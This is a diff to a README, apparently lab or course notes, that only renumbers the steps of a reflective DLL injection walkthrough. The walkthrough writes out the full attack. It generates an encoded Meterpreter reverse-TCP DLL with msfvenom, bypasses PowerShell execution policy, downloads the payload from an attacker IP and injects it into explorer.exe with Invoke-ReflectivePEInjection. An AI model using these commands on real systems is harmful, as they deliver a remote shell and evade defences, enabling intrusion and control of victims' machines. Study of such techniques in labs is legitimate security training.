@@ -7,23 +7,23 @@ For this exercise, we will use a Meterpreter DLL. To reflectively load a Meterpr
 In order to execute the required commands, we must open a PowerShell window with "PowerShell -Exec Bypass", which allows script execution. Once the window is open, we will run the commands below.
 
 # How to use
-Create a DLL payload using msfvenom and upload it to the target machine:
+1. Create a DLL payload using msfvenom and upload it to the target machine:
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f dll -t 300 -e x64/xor_dynamic -o met.dll
 ```
 
-To use `Invoke-ReflectivePEInjection`, we must first upload the script to the target machine and import it from its location with Import-Module:
+1. To use `Invoke-ReflectivePEInjection`, we must first upload the script to the target machine and import it from its location with Import-Module:
 ```powershell
 Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
 ```
 
-Next we will load the DLL into a byte array and retrieve the explorer process ID and :
+1. Next we will load the DLL into a byte array and retrieve the explorer process ID and :
 ```powershell
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.191/met.dll')
 $procid = (Get-Process -Name explorer).Id
 ```
 
-Finally, supply the byte array (-PEBytes) and process ID (-ProcId) and execute the script
+1. Finally, supply the byte array (-PEBytes) and process ID (-ProcId) and execute the script
 ```powershell
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
